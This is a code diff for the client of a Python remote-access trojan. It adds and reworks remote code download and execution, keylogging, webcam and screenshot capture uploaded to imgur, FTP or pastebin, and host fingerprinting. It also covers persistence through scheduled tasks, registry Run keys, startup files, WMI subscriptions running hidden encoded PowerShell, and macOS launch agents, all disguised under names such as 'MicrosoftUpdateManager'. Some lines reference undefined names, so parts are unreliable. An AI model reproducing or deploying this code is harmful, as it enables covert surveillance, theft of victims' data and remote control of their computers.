@@ -45,14 +45,23 @@
 
 import os
 import sys
+import imp
 import time
 import json
+import zlib
+import uuid
+import numpy
+import base64
+import pickle
 import struct
 import socket
+import random
+import ftplib
+import urllib
+import urllib2
 import zipfile
-import requests
-import tempfile
 import threading
+import cStringIO
 import subprocess
 
 
@@ -87,8 +96,54 @@ class Client(object):
             self._print("Bytes-to-long conversion error: {}".format(str(e)))            
 
     def _print(self, data):
-#        if bool('__v__' in vars(self) and self.__v__):
-        print(data)
+        if bool('__v__' in vars(self) and self.__v__):
+            print(data)
+
+    def _is_ipv4_address(self, address):
+        try:
+            if socket.inet_aton(str(address)):
+                return True
+        except:
+            return False
+
+    def _post(self, url, headers={}, data={}):
+        dat = urllib.urlencode(data)
+        req = urllib2.Request(url, data=dat)
+        for key, value in headers.items():
+            req.add_header(key, value)
+        return urllib2.urlopen(req).read()
+
+    def _png(self, image):
+        try:
+            if type(image) == np.ndarray:
+                width, height = (image.shape[1], image.shape[0])
+                data = image.tobytes()
+            else:
+                width, height = (image.width, image.height)
+                data = image.rgb
+        except:
+            return 'Input data type must be one of the following: {}'.format(''.join('\n\t{}'.format(i) for i in [np.ndarray, mss.screenshot.ScreenShot]))
+        line = width * 3
+        png_filter = struct.pack('>B', 0)
+        scanlines = b''.join([png_filter + data[y * line:y * line + line] for y in range(height)])
+        magic = struct.pack('>8B', 137, 80, 78, 71, 13, 10, 26, 10)
+        ihdr = [b'', b'IHDR', b'', b'']
+        ihdr[2] = struct.pack('>2I5B', width, height, 8, 2, 0, 0, 0)
+        ihdr[3] = struct.pack('>I', zlib.crc32(b''.join(ihdr[1:3])) & 0xffffffff)
+        ihdr[0] = struct.pack('>I', len(ihdr[2]))
+        idat = [b'', b'IDAT', zlib.compress(scanlines), b'']
+        idat[3] = struct.pack('>I', zlib.crc32(b''.join(idat[1:3])) & 0xffffffff)
+        idat[0] = struct.pack('>I', len(idat[2]))
+        iend = [b'', b'IEND', b'', b'']
+        iend[3] = struct.pack('>I', zlib.crc32(iend[1]) & 0xffffffff)
+        iend[0] = struct.pack('>I', len(iend[2]))
+        fileh = cStringIO.StringIO()
+        fileh.write(magic)
+        fileh.write(b''.join(ihdr))
+        fileh.write(b''.join(idat))
+        fileh.write(b''.join(iend))
+        return fileh
+
 
     def _command(fx, cx=__command__, mx=__modules__):
         fx.status = threading.Event()
@@ -347,7 +402,7 @@ class Client(object):
   
     def _status(self,c=None): return '{} days, {} hours, {} minutes, {} seconds'.format(int(time.clock() / 86400.0), int((time.clock() % 86400.0) / 3600.0), int((time.clock() % 3600.0) / 60.0), int(time.clock() % 60.0)) if not c else '{} days, {} hours, {} minutes, {} seconds'.format(int(c / 86400.0), int((c % 86400.0) / 3600.0), int((c % 3600.0) / 60.0), int(c % 60.0))
 
-    def _get_info(self): return {k:v for k,v in zip(['IP Address', 'Private IP', 'Platform', 'Version', 'Architecture', 'Username', 'Administrator', 'MAC Address', 'Machine'], [requests.get('http://api.ipify.org').content, socket.gethostbyname(socket.gethostname()), sys.platform, os.popen('ver').read().strip('\n') if os.name is 'nt' else ' '.join(os.uname()), '{}-bit'.format(struct.calcsize('P') * 8), os.getenv('USERNAME', os.getenv('USER')), bool(windll.shell32.IsUserAnAdmin() if os.name is 'nt' else os.getuid() == 0), '-'.join(uuid.uuid1().hex[20:][i:i+2] for i in range(0,11,2)), os.getenv('NAME', os.getenv('COMPUTERNAME', os.getenv('DOMAINNAME')))])}
+    def _get_info(self): return {k:v for k,v in zip(['IP Address', 'Private IP', 'Platform', 'Version', 'Architecture', 'Username', 'Administrator', 'MAC Address', 'Machine'], [urllib2.urlopen('http://api.ipify.org').read(), socket.gethostbyname(socket.gethostname()), sys.platform, os.popen('ver').read().strip('\n') if os.name is 'nt' else ' '.join(os.uname()), '{}-bit'.format(struct.calcsize('P') * 8), os.getenv('USERNAME', os.getenv('USER')), bool(windll.shell32.IsUserAnAdmin() if os.name is 'nt' else os.getuid() == 0), '-'.join(uuid.uuid1().hex[20:][i:i+2] for i in range(0,11,2)), os.getenv('NAME', os.getenv('COMPUTERNAME', os.getenv('DOMAINNAME')))])}
 
     def _help(self, *arg): return ' \n USAGE\t\t\tDESCRIPTION\n --------------------------------------------------\n ' + '\n '.join(['{}\t\t{}'.format(i.usage, i.func_doc) for i in self._commands.values()])
 
@@ -363,32 +418,33 @@ class Client(object):
                 setattr(self, '__{}__'.format(chr(i)), kwargs.get('__{}__'.format(chr(i))))
 
     def _screenshot(self):
-        tmp = tempfile.mktemp(suffix='.png')
-        with mss.mss() as screen:
-            img = screen.shot(output=tmp)
+        with mss() as screen:
+            img = screen.grab(screen.monitors[0])
         result = self._upload_imgur(img)
-        self._result['screenshot'].update({ time.ctime() : result })
+        self._result['screenshot'][time.ctime()] = result
         return result
 
     def _keylogger(self):
         self._threads['keylogger'] = threading.Thread(target=self._keylogger_manager, name=time.time())
         self._threads['keylogger'].start()
-        return 'Keylogger started at {}'.format(time.ctime())
+        return 'Keylogger running.'.format(time.ctime())
 
     def _webcam(self):
         if self.webcam.options['video']:
             if 'video' not in self._result['webcam']:
                 self._result['webcam'].update({'video': {}})
             output = self._webcam_video()
+            if self.webcam.options['upload'].lower() == 'ftp':
+                result = self._upload_ftp(output)
             self._result['webcam']['video'][time.ctime()] = result
         else:
             if 'image' not in self._result['webcam']:
                 self._result['webcam'].update({'image': {}})
             output = self._webcam_image()
-            if self.webcam.upload.lower() == 'imgur':
+            if self.webcam.options['upload'].lower() == 'imgur':
                 result = self._upload_imgur(output)
-            elif self.webcam.upload.lower() == 'ftp':
-                result = self._upload_ftp(
+            elif self.webcam.options['upload'].lower() == 'ftp':
+                result = self._upload_ftp(output)
             self._result['webcam']['image'][time.ctime()] = result
         return result
 
@@ -429,9 +485,9 @@ class Client(object):
 
     def _connect(self, host='localhost', port=1337):
         def _addr(a, b, c):
-            ab  = requests.get(a, headers={'API-Key': b}).json()
+            ab  = json.loads(self._post(a, headers={'API-Key': b}))
             ip  = ab[ab.keys()[0]][0].get('ip')
-            if requests.utils.is_ipv4_address(ip):
+            if self._is_ipv4_address(ip):
                 return _sock((ip, c))
             else:
                 self._print('Target value not an IPv4 address\nRetrying in 5...'.format(_))
@@ -632,7 +688,7 @@ class Client(object):
         sources = ['http://api.ipify.org','http://v4.ident.me','http://canihazip.com/s']
         for target in sources:
             try:
-                ip = requests.get(target).content
+                ip = urllib2.urlopen(target).read()
                 if socket.inet_aton(ip):
                     return ip
             except: pass
@@ -666,7 +722,7 @@ class Client(object):
         try:
             name = os.path.splitext(os.path.basename(uri))[0] if 'name' not in kwargs else str(kwargs.get('name'))
             module = imp.new_module(name)
-            source = requests.get(uri).content
+            source = urllib2.urlopen(uri).read()
             code = compile(source, name, 'exec')
             exec code in module.__dict__
             self._modules[name] = module
@@ -694,42 +750,27 @@ class Client(object):
         except Exception as e:
             self._print('Powershell error: {}'.format(str(e)))
 
-    def _get_logger(self, port=4321):
-        module_logger = getLogger(self._info.get('IP Address'))
-        module_logger.handlers = []
-        module_handler = SocketHandler(self._target(), port)
-        module_logger.addHandler(module_handler)
-        return module_logger
-
-    def _upload_imgur(self, source, override=False):
-        if not self.upload.status.is_set() and not override:
-            return filename
+    def _upload_imgur(self, source):
         if not self.upload.options['imgur'].get('api_key'):
             return "Error: no api key found"
         try:
-            result  = requests.post('https://api.imgur.com/3/upload', headers={'Authorization': self.upload.options['imgur'].get('api_key')}, data={'image': base64.b64encode(source.getvalue()), 'type': 'base64'}).json().get('data').get('link')
+            source.seek(0)
+            result  = json.loads(self._post('https://api.imgur.com/3/upload', headers={'Authorization': self.upload.options['imgur'].get('api_key')}, data={'image': base64.b64encode(source.read()), 'type': 'base64'}))['data']['link']
         except Exception as e:
             result  = str(e)
         return result
 
-    def _upload_pastebin(self, source, override=False):
-        info = {'api_option': 'paste'}
+    def _upload_pastebin(self, source):
         if not self.upload.status.is_set() and not override:
             return path
-        info['api_paste_code'] = source.getvalue()
-        if self.upload.options['pastebin'].get('api_key'):
-            info['api_dev_key']  = self.upload.options['pastebin'].get('api_key')
-        else:
-            return "Error: no api key found"
-        if self.upload.options['pastebin'].get('user_key'):
-            info['api_user_key'] = self.upload.options['pastebin'].get('user_key')
         try:
-            result = requests.post('https://pastebin.com/api/api_post.php', data=info).content
+            source.seek(0)
+            result = self._post('https://pastebin.com/api/api_post.php', data={'api_option': 'paste', 'api_paste_code': source.read(), 'api_dev_key': self.upload.options['pastebin'].get('api_key'), 'api_user_key': self.upload.options['pastebin'].get('user_key')})
         except Exception as e:
             result = str(e)
         return result
      
-    def _upload_ftp(self, source, override=False):
+    def _upload_ftp(self, source):
         if not self.upload.status and not override:
             return source
         if not self.upload.options['ftp'].get('host') or not self.upload.options['ftp'].get('username') or not self.upload.options['ftp'].get('password'):
@@ -745,7 +786,6 @@ class Client(object):
             result  = '/htdocs/{}/{}'.format(self._info.get('IP Address'), '{}-{}_{}.txt'.format(local[1], local[2], local[3]))
             if os.path.isfile(str(source)):
                 source = open(source, 'rb')
-            source.seek(0)
             upload  = host.storbinary('STOR ' + result, source)
         except Exception as e:
             result = str(e)
@@ -758,10 +798,9 @@ class Client(object):
         source  = args[1]
         if mode not in self.upload.options:
             return "Error: mode must be a valid upload option: {}".format(', '.join(["'{}'".format(i) for i in self.upload.options]))
-        if not hasattr(target, 'read'):
-            return "Error: source must be readable buffer object"
         try:
-            return getattr(self, '_upload_{}'.format(mode.lower(), override=True))(source)
+            
+            return getattr(self, '_upload_{}'.format(mode.lower()))(open(source, 'rb'))
         except Exception as e:
             return 'Upload error: {}'.format(str(e))
 
@@ -930,30 +969,40 @@ class Client(object):
     # ------------------- webcam -------------------------
 
     def _webcam_image(self):
+        opt = str(self.webcam.options['upload']).lower()
+        if opt not in ('imgur','ftp'):
+            return "Error: invalid upload option - '{}'\nValid upload options for webcam images: 'imgur','ftp'".format(opt)
         dev = VideoCapture(0)
         r,f = dev.read()
         dev.release()
-        opt = self.webcam.options['upload']
-        buf = cStringIO.StringIO(f.tobytes())
-        out = getattr(self, '_upload_{}'.format(str(opt).lower()))(buf) if bool(self.upload.status.is_set() and str(opt).lower() in ('imgur','ftp')) else buf.getvalue()
+        if not r:
+            return "Error: unable to access webcam"
+        png = self._png(f)
+        try:
+            result = getattr(self, '_upload_{}'.format(opt))(png)
+        except Exception as e:
+            result = 'Upload error: {}'.format(str(e))
         return result
 
-    def _webcam_video(self):
-        fpath  = cStringIO.StringIO()
-        fourcc = VideoWriter_fourcc(*'DIVX') if sys.platform is 'win32' else VideoWriter_fourcc(*'XVID')
-        output = VideoWriter(fpath, fourcc, 20.0, (640,480))
-        dev = VideoCapture(0)
-        end = time.time() + 5.0
-        while True:
-            ret, frame = dev.read()
-            output.write(frame)
-            if waitKey(0) and time.time() > end: break
-        dev.release()
+    def _webcam_video(self, duration=5.0):
         if str(self.webcam.options['upload']).lower() == 'ftp':
-            result = self._upload_ftp(fpath)
+            try:
+                fpath  = cStringIO.StringIO()
+                fourcc = VideoWriter_fourcc(*'DIVX') if sys.platform is 'win32' else VideoWriter_fourcc(*'XVID')
+                output = VideoWriter(fpath, fourcc, 20.0, (640,480))
+                end = time.time() + duration
+                dev = VideoCapture(0)
+                while True:
+                    ret, frame = dev.read()
+                    output.write(frame)
+                    if time.time() > end: break
+                dev.release()
+                result = self._upload_ftp(fpath)
+            except Exception as e:
+                result = "Error capturing video: {}".format(str(e))
         else:
-            result = 'Error: video 
-            return result
+            result = "Error: FTP upload is the only option for video captured from webcam"
+        return result
 
     # ------------------- packetsniff -------------------------
 
@@ -1099,10 +1148,9 @@ class Client(object):
 
     # ------------------- persistence -------------------------
 
-    def _persistence_add_scheduled_task(self):
+    def _persistence_add_scheduled_task(self, task_name='MicrosoftUpdateManager'):
         if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))):
-            tmpdir = tempfile.gettempdir()
-            task_name = 'MicrosoftUpdateManager'
+            tmpdir = os.path.expandvars('%TEMP%')
             task_run = os.path.join(tmpdir, self._long_to_bytes(long(self.__f__)))
             copy = 'copy' if os.name is 'nt' else 'cp'
             if not os.path.isfile(task_run):
@@ -1117,76 +1165,74 @@ class Client(object):
                 self._print('Add scheduled task error: {}'.format(str(e)))
         return False
 
-    def _persistence_remove_scheduled_task(self):
+    def _persistence_remove_scheduled_task(self, task_name='MicrosoftUpdateManager'):
         if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))):
             try:
-                task_name = name or os.path.splitext(os.path.basename(self._long_to_bytes(long(self.__f__))))[0]
                 if subprocess.call('SCHTASKS /DELETE /TN {} /F'.format(task_name), shell=True) == 0:
                     _ = self._result['persistence'].pop('scheduled_task', None)
                     return True
             except: pass
             return False
 
-    def _persistence_add_startup_file(self):
+    def _persistence_add_startup_file(self, task_name='MicrosoftUpdateManager'):
         if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))):
             try:
                 appdata = os.path.expandvars("%AppData%")
                 startup_dir = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
                 if not os.path.exists(startup_dir):
                     os.makedirs(startup_dir)
-                random_name = str().join([random.choice([chr(i).lower() for i in range(123) if chr(i).isalnum()]) for _ in range(random.choice(range(6,12)))])
-                startup_file = os.path.join(startup_dir, '%s.eu.url' % random_name)
+                startup_file = os.path.join(startup_dir, '%s.eu.url' % task_name)
                 content = '\n[InternetShortcut]\nURL=file:///%s\n' % self._long_to_bytes(long(self.__f__))
-                with file(startup_file, 'w') as fp:
-                    fp.write(content)
-                if startup_file in os.listdir(startup_dir):
-                    self._result['persistence']['startup_file'] = startup_file
-                    return True
+                if not os.path.exists(startup_file) or content != open(startup_file, 'r').read():
+                    with file(startup_file, 'w') as fp:
+                        fp.write(content)
+                self._result['persistence']['startup_file'] = startup_file
+                return True
             except Exception as e:
                 self._print('Adding startup file error: {}'.format(str(e)))
         return False
 
-    def _persistence_remove_startup_file(self):
+    def _persistence_remove_startup_file(self, task_name='MicrosoftUpdateManager'):
         if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))):
-            try:
-                appdata = os.path.expandvars("%AppData%")
-                startup_dir = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
-                if os.path.exists(startup_dir):
-                    for f in os.listdir(startup_dir):
-                        filepath = os.path.join(startup_dir, f)
-                        if filepath.endswith('.eu.url'):
-                            try:
-                                os.remove(filepath)
-                                _ = self._result['persistence'].pop('startup_file', None)
-                                return True
-                            except: pass
-            except: pass
+            appdata      = os.path.expandvars("%AppData%")
+            startup_dir  = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
+            startup_file = os.path.join(startup_dir, task_name) + '.eu.url'
+            if os.path.exists(startup_file):
+                try:
+                    os.remove(startup_file)
+                    _ = self._result['persistence'].pop('startup_file', None)
+                    return True
+                except:
+                    try:
+                        _  = os.popen('del {} /f'.format(startup_file)).read()
+                        return True
+                    except: pass
             return False
 
-    def _persistence_add_registry_key(self, name='MicrosoftUpdateManager'):
+    def _persistence_add_registry_key(self, task_name='MicrosoftUpdateManager'):
         if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))):
             run_key = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
             reg_key = OpenKey(HKEY_CURRENT_USER, run_key, 0, KEY_WRITE)
             value = self._long_to_bytes(long(self.__f__))
             try:
-                SetValueEx(reg_key, name, 0, REG_SZ, value)
+                SetValueEx(reg_key, task_name, 0, REG_SZ, value)
                 CloseKey(reg_key)
                 return True
             except Exception as e:
                 self._print('Remove registry key error: {}'.format(str(e)))
         return False
 
-    def _persistence_remove_registry_key(self, name='MicrosoftUpdateManager'):
+    def _persistence_remove_registry_key(self, task_name='MicrosoftUpdateManager'):
         try:
             key = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
-            DeleteValue(key, name)
+            DeleteValue(key, task_name)
             CloseKey(key)
             _ = self._result['persistence'].pop('registry_key', None)
             return True
         except: pass
         return False
 
-    def _persistence_add_wmi_object(self, command=None, name='MicrosoftUpdaterManager'):
+    def _persistence_add_wmi_object(self, command=None, task_name='MicrosoftUpdaterManager'):
         try:
             cmd_line = ''
             if hasattr(self, '__f__'):
@@ -1197,24 +1243,24 @@ class Client(object):
                 cmd_line = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(base64.b64encode(command.encode('UTF-16LE')))
             if len(cmd_line):
                 startup = "'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
-                powershell = requests.get(self._long_to_bytes(self.__s__)).content.replace('[STARTUP]', startup).replace('[COMMAND_LINE]', cmd_line).replace('[NAME]', name)
+                powershell = urllib2.urlopen(self._long_to_bytes(self.__s__)).read().replace('[STARTUP]', startup).replace('[COMMAND_LINE]', cmd_line).replace('[NAME]', task_name)
                 self._powershell(powershell)
-                code = "Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='%s'\"" % name
+                code = "Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='%s'\"" % task_name
                 result = self._powershell(code)
-                if name in result:
+                if task_name in result:
                     self._result['persistence']['wmi_object'] = result
                     return True
         except Exception as e:
             self._print('WMI persistence error: {}'.format(str(e)))        
         return False
 
-    def _persistence_remove_wmi_object(self, name='MicrosoftUpdaterManager'):
+    def _persistence_remove_wmi_object(self, task_name='MicrosoftUpdaterManager'):
         if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))):
             try:
-                code = ''' 
+                code = """
                 Get-WmiObject __eventFilter -namespace root\subscription -filter "name='[NAME]'"| Remove-WmiObject
                 Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='[NAME]'" | Remove-WmiObject
-                Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match '[NAME]'} | Remove-WmiObject'''.replace('[NAME]', name)
+                Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match '[NAME]'} | Remove-WmiObject""".replace('[NAME]', task_name)
                 result = self._powershell(code)
                 if not result:
                     _ = self._result['persistence'].pop('wmi_object', None)
@@ -1222,7 +1268,7 @@ class Client(object):
             except: pass
         return False
 
-    def _persistence_add_hidden_file(self):
+    def _persistence_add_hidden_file(self, *args, **kwargs):
         if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))):
             try:
                 name = os.path.basename(self._long_to_bytes(long(self.__f__)))
@@ -1241,39 +1287,47 @@ class Client(object):
 
     def _persistence_remove_hidden_file(self, *args, **kwargs):
         if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))):
+            filename    = self._long_to_bytes(long(self.__f__))
             try:
-                if subprocess.call('attrib -h {}'.format(self._long_to_bytes(long(self.__f__))), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
+                unhide  = 'attrib -h {}'.format(filename) if os.name is 'nt' else 'mv {} {}'.format(filename, os.path.join(os.path.dirname(filename), os.path.basename(filename).strip('.')))
+                if subprocess.call(unhide, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
                     _ = self._result['persistence'].pop('hidden_file', None)
                     return True
             except Exception as e:
                 self._print('Error unhiding file: {}'.format(str(e)))
         return False
 
-    def _persistence_add_launch_agent(self, name='com.apple.update.manager'):
+    def _persistence_add_launch_agent(self, task_name='com.apple.update.manager'):
         if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))):
             try:
-                code = requests.get(self._long_to_bytes(self.__g__)).content
+                code = urllib2.urlopen(self._long_to_bytes(long(self.__g__))).read()
                 label = name
-                fpath = tempfile.mktemp(suffix='.sh')
+                if not os.path.exists('/var/tmp'):
+                    os.makedirs('/var/tmp')
+                fpath = '/var/tmp/.{}.sh'.format(task_name)
                 bash = code.replace('__LABEL__', label).replace('__FILE__', self._long_to_bytes(long(self.__f__)))
-                fileobj = file(fpath, 'w')
-                fileobj.write(bash)
-                fileobj.close()
-                bin_sh = bytes().join(subprocess.Popen('/bin/sh {}'.format(x), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
-                self._result['persistence']['launch agent'] = '~/Library/LaunchAgents/{}.plist'.format(label)
+                with file(fpath, 'w') as fileobj:
+                    fileobj.write(bash)
+                bin_sh = bytes().join(subprocess.Popen('/bin/sh {}'.format(fpath), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
+                time.sleep(2)
+                launch_agent= '~/Library/LaunchAgents/{}.plist'.format(label)
+                if os.path.isfile(launch_agent):
+                    os.remove(fpath)
+                    self._result['persistence']['launch agent'] = launch_agent
                 return True
             except Exception as e2:
                 self._print('Error: {}'.format(str(e2)))
         return False
 
-    def _persistence_remove_launch_agent(self, name=None):
+    def _persistence_remove_launch_agent(self, *args, **kwargs):
         if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))):
-            try:
-                name = name or os.path.splitext(os.path.basename(self._long_to_bytes(long(self.__f__))))[0]
-                os.remove('~/Library/LaunchAgents/{}.plist'.format(name))
-                _ = self._result['persistence'].pop('launch_agent', None)
-                return True
-            except: pass
+            launch_agent = self._results['persistence'].get('launch_agent')
+            if os.path.isfile(launch_agent):
+                try:
+                    os.remove(launch_agent)
+                    _ = self._result['persistence'].pop('launch_agent', None)
+                    return True
+                except: pass
         return False
 
 
